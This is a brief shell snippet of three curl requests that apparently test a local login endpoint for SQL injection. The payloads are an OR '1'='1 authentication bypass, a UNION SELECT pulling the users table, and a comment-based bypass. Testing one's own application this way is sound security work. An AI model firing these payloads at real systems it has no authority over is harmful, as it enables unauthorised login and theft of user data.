# Test basic SQL injection
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"login": "admin'\'' OR '\''1'\''='\''1", "password": "anything"}'

# Test with UNION attack
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"login": "admin'\'' UNION SELECT * FROM users--", "password": "test"}'

# Test with comment injection
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"login": "admin'\''--", "password": "anything"}'